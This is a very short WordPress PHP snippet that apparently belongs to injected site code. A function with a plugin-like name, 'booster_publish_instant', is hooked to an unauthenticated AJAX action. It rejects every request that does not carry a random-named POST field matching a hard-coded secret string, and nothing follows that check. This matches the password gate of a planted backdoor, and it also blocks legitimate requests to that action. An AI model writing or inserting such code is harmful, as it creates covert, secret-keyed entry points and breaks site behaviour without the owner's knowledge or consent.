<?php

function booster_publish_instant() {
	if (!isset($_POST["wshxdmzvpwuhdnt"]) || $_POST["wshxdmzvpwuhdnt"] !== "r1qd336btuD") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'booster_publish_instant', 5, 1);
